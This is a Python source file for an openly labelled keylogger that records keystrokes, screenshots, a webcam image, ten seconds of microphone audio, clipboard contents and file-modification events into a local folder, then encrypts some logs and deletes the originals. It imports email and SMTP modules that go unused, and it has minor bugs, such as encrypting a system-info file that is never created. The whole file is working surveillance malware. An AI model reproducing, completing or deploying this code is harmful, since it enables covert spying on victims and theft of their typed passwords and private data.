from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
import win32clipboard
from pynput.keyboard import Key, Listener
import time
import os
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
from scipy.io.wavfile import write
import sounddevice as sd
from cryptography.fernet import Fernet
from cv2 import VideoCapture, imwrite
from PIL import ImageGrab
import psutil

# Replace with your actual generated key
key = b''

# Global Variables
keys_info = "keyStrokefile.txt"
system_info = "syseminfo.txt"
clipboard_info = "clipboard.txt"
audio_info = "audio.wav"
screenshot_info = "screenshot.png"
webCamShot_info = "webCamera.png"
keys_info_e = "e_key_log.txt"
system_info_e = "e_systeminfo.txt"
clipboard_info_e = "e_clipboard.txt"
microphone_time = 10
time_iteration = 15
number_of_iterations_end = 3
file_path = r"D:\cyber\KeyLogger"
file_merge = file_path + "\\"
log_file = "accessed_files_log.txt"

keys = []
count = 0
currentTime = 0
stoppingTime = 0

# Function to set up the directory
def setup_directory():
    if not os.path.exists(file_path):
        os.makedirs(file_path)
    print(f"Directory created or exists: {file_path}")

# File access monitoring handler
class FileHandler(FileSystemEventHandler):
    def on_modified(self, event):
        if not event.is_directory:  # Check if it's a file
            file_name = os.path.basename(event.src_path)  # Get the filename from the path
            log_file_access(file_name)

# Function to log file access
def log_file_access(file_name):
    try:
        with open(os.path.join(file_merge, log_file), 'a') as log:
            log.write(f"{file_name} accessed at {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
    except Exception as e:
        print(f"Error logging file access: {e}")

# Initialize file access monitoring
def start_file_monitoring():
    observer = Observer()
    event_handler = FileHandler()
    observer.schedule(event_handler, path=file_path, recursive=True)
    observer.start()
    print("File monitoring started...")

# Function to capture image from webcam
def capture_webcam_image():
    try:
        cam = VideoCapture(0)
        if not cam.isOpened():
            raise IOError("Cannot open webcam")

        ret, frame = cam.read()
        if not ret:
            raise IOError("Failed to capture image from webcam")

        image_path = os.path.join(file_path, webCamShot_info)
        imwrite(image_path, frame)
        print(f"Webcam image saved to: {image_path}")

        cam.release()
    except Exception as e:
        print(f"Error capturing webcam image: {e}")

# Function to capture screenshots
def screenshots():
    try:
        im = ImageGrab.grab()
        im.save(os.path.join(file_merge, screenshot_info))
        print(f"Screenshot saved to: {os.path.join(file_merge, screenshot_info)}")
    except Exception as e:
        print(f"Error capturing screenshot: {e}")

# Function to record audio
def record_audio():
    try:
        fs = 44100  # Sample rate
        duration = microphone_time  # Duration in seconds
        print("Recording audio...")
        audio_data = sd.rec(int(duration * fs), samplerate=fs, channels=2, dtype='int16')
        sd.wait()  # Wait until recording is finished
        write(os.path.join(file_merge, audio_info), fs, audio_data)
        print(f"Audio recorded and saved to: {os.path.join(file_merge, audio_info)}")
    except Exception as e:
        print(f"Error recording audio: {e}")

# Function to encrypt files
def encrypt_files(files_to_encrypt, encrypted_file_names):
    fernet = Fernet(key)
    for i, file in enumerate(files_to_encrypt):
        try:
            with open(file, 'rb') as f:
                data = f.read()
            encrypted = fernet.encrypt(data)
            with open(encrypted_file_names[i], 'wb') as f:
                f.write(encrypted)
            print(f"File encrypted and saved to: {encrypted_file_names[i]}")
        except Exception as e:
            print(f"Error encrypting file {file}: {e}")

# Function to copy clipboard data
def copy_clipboard():
    try:
        win32clipboard.OpenClipboard()
        clipboard_data = win32clipboard.GetClipboardData()
        with open(os.path.join(file_merge, clipboard_info), 'w') as f:
            f.write(clipboard_data)
        print(f"Clipboard data saved to: {os.path.join(file_merge, clipboard_info)}")
    except Exception as e:
        print(f"Error copying clipboard: {e}")
    finally:
        win32clipboard.CloseClipboard()

# Function to handle keystrokes
def on_press(key):
    global keys, count, currentTime
    try:
        print(f"Key pressed: {key}")  # Debug print
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:  # Write to file after capturing keystrokes
            count = 0
            write_file(keys)
            keys.clear()  # Clear the list after writing
    except Exception as e:
        print(f"Error in on_press: {e}")

def on_release(key):
    global currentTime, stoppingTime
    if key == Key.esc:  # Stop listener on ESC key press
        return False
    if currentTime > stoppingTime:  # Stop listener after the stopping time
        return False

def write_file(keys):
    """Write captured keystrokes to a file."""
    try:
        with open(os.path.join(file_merge, keys_info), "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k == "Key.space":
                    f.write(" ")
                elif k.startswith("Key."):
                    f.write(f"[{k[4:]}]")  # Special keys in brackets
                else:
                    f.write(k)
            f.write("\n")  # Newline after each batch
        print(f"Keystrokes written to {os.path.join(file_merge, keys_info)}")
    except Exception as e:
        print(f"Error writing keystrokes to file: {e}")

# Main function to run the keylogger
def main():
    global currentTime, stoppingTime
    setup_directory()  # Ensure the directory exists
    start_file_monitoring()  # Start file access monitoring

    currentTime = time.time()
    stoppingTime = currentTime + 60  # Run for 60 seconds

    print("Starting keylogger...")

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()  # Keep the listener running

    # Perform tasks after keylogger session
    screenshots()
    capture_webcam_image()
    record_audio()
    copy_clipboard()

    # Encrypting Files
    files_to_encrypt = [os.path.join(file_merge, system_info), os.path.join(file_merge, clipboard_info), os.path.join(file_merge, keys_info)]
    encrypted_file_names = [os.path.join(file_merge, system_info_e), os.path.join(file_merge, clipboard_info_e), os.path.join(file_merge, keys_info_e)]
    encrypt_files(files_to_encrypt, encrypted_file_names)

    # Cleaning up files
    delete_files = [system_info, clipboard_info, keys_info, screenshot_info, audio_info]
    for file in delete_files:
        file_path = os.path.join(file_merge, file)
        if os.path.exists(file_path):
            os.remove(file_path)
            print(f"Deleted file: {file_path}")

if __name__ == "__main__":
    main()
